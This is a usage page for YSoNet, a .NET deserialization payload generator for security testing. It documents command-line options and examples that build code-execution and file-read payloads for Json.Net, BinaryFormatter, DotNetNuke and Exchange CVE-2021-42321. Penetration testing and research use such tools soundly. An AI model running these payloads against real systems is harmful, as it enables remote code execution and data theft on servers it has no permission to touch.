# Usage and Examples

Command-line reference for YSoNet, plus worked examples. For the gadget and plugin catalog, see [Gadgets and Plugins](gadgets-and-plugins.md).

Back to [documentation index](README.md).

## Command line

Use `ysonet.exe --fullhelp` to see the full details. You can also see a specific gadget's or plugin's help:

- `ysonet.exe -g NameHere -help`
- `ysonet.exe -p NameHere -help`

```text
Usage: ysonet.exe [options]
Options:
  -p, --plugin=VALUE         The plugin to be used.
  -o, --output=VALUE         The output format (raw|base64|raw-
                               urlencode|base64-urlencode|hex).
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter.
  -c, --command=VALUE        The command to be executed.
      --rawcmd               Command will be executed as is without `cmd /c `
                               being appended (anything after first space is an
                               argument).
  -s, --stdin                The command to be executed will be read from
                               standard input.
      --bgc, --bridgedgadgetchains=VALUE
                             Chain of bridged gadgets separated by comma (,).
                               Each gadget will be used to complete the next
                               bridge gadget. The last one will be used in the
                               requested gadget. This will be ignored when
                               using the searchformatter argument.
  -t, --test                 Whether to run payload locally. Default: false
      --outputpath=VALUE     The output file path. It will be ignored if
                               empty.
      --minify               Whether to minify the payloads where applicable.
                               Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple
                               (always `true` with `--minify` for binary
                               formatters). Default: true
      --raf, --runallformatters
                             Whether to run all the gadgets with the provided
                               formatter (ignores gadget name, output format,
                               and the test flag arguments). This will search
                               in formatters and also show the displayed
                               payload length. Default: false
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant
                               gadgets and their formatters (other parameters
                               will be ignored).
      --debugmode            Enable debugging to show exception errors and
                               output length
  -h, --help                 Shows this message and exit.
      --fullhelp             Shows this message + extra options for gadgets
                               and plugins and exit.
      --credit               Shows the credit/history of gadgets and plugins
                               (other parameters will be ignored).
      --runmytest            Runs that `Start` method of `TestingArenaHome` -
                               useful for testing and debugging.
```

Note: Machine authentication code (MAC) key modifier is not used for LosFormatter in YSoNet. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.

## Tips

When specifying complex commands, it can be tedious to escape some special characters (`;`, `|`, `&`, ..). Use the stdin option (`-s`) to read the command from stdin:

```bash
cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
```

XmlSerializer and DataContractSerializer formatters generate a wrapper XML format including the expected type in the `type` attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated XML based on how XmlSerializer gets the expected type in your case.

## Examples

### Generate a calc.exe payload for Json.Net using the ObjectDataProvider gadget

```bash
./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
```

### Generate a calc.exe payload for BinaryFormatter using the PSObject gadget

```bash
./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

### Generate a run_command payload for DotNetNuke using its plugin

```bash
./ysonet.exe -p DotNetNuke -m run_command -c calc.exe
```

### Generate a read_file payload for DotNetNuke using its plugin

```bash
./ysonet.exe -p DotNetNuke -m read_file -f win.ini
```

### Generate a minified BinaryFormatter payload for Exchange CVE-2021-42321

Uses the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.

```bash
./ysonet.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```
